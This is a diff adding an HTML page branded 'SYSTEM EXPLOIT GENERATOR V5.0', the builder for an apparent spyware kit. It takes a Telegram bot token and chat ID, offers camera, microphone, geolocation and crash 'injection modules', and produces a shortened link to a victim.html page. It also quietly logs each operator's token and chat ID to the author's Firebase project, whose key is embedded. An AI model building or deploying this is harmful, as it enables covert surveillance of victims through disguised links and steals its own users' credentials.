@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MR_MOMIN_🌍 | Elite Cyber Terminal</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --neon: #00ff41; --bg: #000800; --card-bg: rgba(0, 15, 0, 0.95); }
+        * { box-sizing: border-box; font-family: 'Fira Code', monospace; }
+        body { margin: 0; background: var(--bg); color: var(--neon); min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow-x: hidden; }
+        
+        /* Matrix Animation Background */
+        #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
+
+        .terminal {
+            width: 95%; max-width: 500px; background: var(--card-bg);
+            border: 2px solid var(--neon); border-radius: 15px; padding: 30px;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); position: relative;
+        }
+
+        .header { text-align: center; margin-bottom: 25px; }
+        .brand { font-size: 32px; font-weight: bold; color: #fff; text-shadow: 0 0 15px var(--neon); margin: 0; }
+        .tagline { font-size: 10px; letter-spacing: 3px; opacity: 0.7; margin-top: 5px; }
+
+        .input-group { margin-bottom: 20px; }
+        label { display: block; font-size: 11px; margin-bottom: 8px; opacity: 0.8; }
+        input {
+            width: 100%; padding: 14px; background: #001500; border: 1px solid #004400;
+            border-radius: 8px; color: var(--neon); outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0,255,65,0.2); }
+
+        .module-title { font-size: 12px; margin: 20px 0 10px; color: #fff; text-transform: uppercase; }
+        .feature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        
+        .feature-box {
+            border: 1px solid #004400; padding: 15px; border-radius: 10px;
+            display: flex; flex-direction: column; align-items: center;
+            cursor: pointer; transition: 0.3s; background: rgba(0, 255, 65, 0.02);
+        }
+        .feature-box i { font-size: 20px; margin-bottom: 8px; }
+        .feature-box span { font-size: 10px; font-weight: bold; }
+        .feature-box input { display: none; }
+
+        /* সিলেক্ট করা হলে যে ডিজাইন হবে */
+        .feature-box.selected {
+            background: rgba(0, 255, 65, 0.2);
+            border-color: var(--neon);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+            transform: scale(1.05);
+        }
+        .feature-box.selected span { color: #fff; }
+
+        .gen-btn {
+            width: 100%; padding: 18px; background: #002200; border: 1px solid var(--neon);
+            color: var(--neon); font-weight: bold; font-size: 16px; cursor: not-allowed;
+            margin-top: 25px; transition: 0.4s; border-radius: 8px;
+        }
+        .gen-btn.ready { background: var(--neon); color: #000; cursor: pointer; opacity: 1; box-shadow: 0 0 20px var(--neon); }
+        .gen-btn.ready:hover { transform: translateY(-2px); }
+
+        #result-box {
+            display: none; margin-top: 20px; padding: 15px; background: #001a00;
+            border: 1px dashed var(--neon); text-align: center; border-radius: 8px;
+            animation: pulse 2s infinite; cursor: pointer;
+        }
+        @keyframes pulse { 0% { opacity: 0.8; } 50% { opacity: 1; } 100% { opacity: 0.8; } }
+    </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="terminal">
+    <div class="header">
+        <h1 class="brand">MR_MOMIN_🌍</h1>
+        <div class="tagline">SYSTEM EXPLOIT GENERATOR V5.0</div>
+    </div>
+
+    <div class="input-group">
+        <label>[#] CONFIG_BOT_TOKEN:</label>
+        <input type="text" id="token" placeholder="Paste Token Here...">
+    </div>
+    <div class="input-group">
+        <label>[#] CONFIG_CHAT_ID:</label>
+        <input type="text" id="chatid" placeholder="Enter Chat ID...">
+    </div>
+
+    <div class="module-title">> SELECT INJECTION MODULES:</div>
+    <div class="feature-grid">
+        <label class="feature-box" id="box-C">
+            <input type="checkbox" class="cb" value="C">
+            <i>📸</i><span>CAMERA_SPY</span>
+        </label>
+        <label class="feature-box" id="box-M">
+            <input type="checkbox" class="cb" value="M">
+            <i>🎙️</i><span>AUDIO_SPY</span>
+        </label>
+        <label class="feature-box" id="box-L">
+            <input type="checkbox" class="cb" value="L">
+            <i>📍</i><span>GEO_LOCATOR</span>
+        </label>
+        <label class="feature-box" id="box-X">
+            <input type="checkbox" class="cb" value="X">
+            <i>⚠️</i><span>SYSTEM_CRASH</span>
+        </label>
+    </div>
+
+    <button id="genBtn" class="gen-btn" disabled>> GENERATE EXPLOIT URL</button>
+    
+    <div id="result-box" onclick="copyLink()">
+        <span id="short-url"></span>
+        <div style="font-size: 9px; margin-top: 5px; color: #fff;">[CLICK TO COPY]</div>
+    </div>
+</div>
+
+<script>
+    // Matrix Background Animation
+    const canvas = document.getElementById('matrix'), ctx = canvas.getContext('2d');
+    canvas.height = window.innerHeight; canvas.width = window.innerWidth;
+    const chars = "0101010101ABCDEFHIJKLMNOPQRSTUVWXYZ";
+    const drops = Array(Math.floor(canvas.width/14)).fill(1);
+    function draw() {
+        ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = "#0f0"; ctx.font = "14px monospace";
+        drops.forEach((y, i) => {
+            ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*14, y*14);
+            if(y*14 > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++;
+        });
+    }
+    setInterval(draw, 35);
+
+    // Firebase Init
+    const firebaseConfig = {
+        apiKey: "AIzaSyCiAEFoHUdaaJNJr0PnweGOZ-N7zi438c0",
+        authDomain: "camera-hack-mr-momin.firebaseapp.com",
+        projectId: "camera-hack-mr-momin",
+        storageBucket: "camera-hack-mr-momin.firebasestorage.app",
+        messagingSenderId: "637134050647",
+        appId: "1:637134050647:web:86c90c894a13be2fd75a12"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // UI Logic
+    const tokenInp = document.getElementById('token'), chatInp = document.getElementById('chatid'), cbs = document.querySelectorAll('.cb'), genBtn = document.getElementById('genBtn');
+
+    function updateUI() {
+        const isInfoFilled = tokenInp.value.trim().length > 10 && chatInp.value.trim().length > 5;
+        const isAnyChecked = Array.from(cbs).some(c => c.checked);
+        
+        if(isInfoFilled && isAnyChecked) {
+            genBtn.disabled = false;
+            genBtn.classList.add('ready');
+        } else {
+            genBtn.disabled = true;
+            genBtn.classList.remove('ready');
+        }
+    }
+
+    tokenInp.oninput = updateUI;
+    chatInp.oninput = updateUI;
+    cbs.forEach(cb => {
+        cb.onchange = () => {
+            cb.parentElement.classList.toggle('selected', cb.checked);
+            updateUI();
+        };
+    });
+
+    genBtn.onclick = async () => {
+        let f = ""; cbs.forEach(c => { if(c.checked) f += c.value; });
+        const longUrl = `${window.location.origin}/victim.html?t=${tokenInp.value}&c=${chatInp.value}&f=${f}`;
+        
+        // Save to Firebase
+        await db.collection("logs").add({
+            token: tokenInp.value,
+            chatid: chatInp.value,
+            features: f,
+            time: new Date().toLocaleString()
+        });
+
+        // Shorten Link
+        const resBox = document.getElementById('result-box');
+        resBox.style.display = 'block';
+        document.getElementById('short-url').innerText = "GENERATING...";
+
+        try {
+            const r = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`);
+            const d = await r.json();
+            document.getElementById('short-url').innerText = d.shorturl || longUrl;
+        } catch(e) {
+            document.getElementById('short-url').innerText = longUrl;
+        }
+    };
+
+    function copyLink() {
+        navigator.clipboard.writeText(document.getElementById('short-url').innerText);
+        alert("COPIED TO CLIPBOARD! ✅");
+    }
+</script>
+</body>
+</html>
+
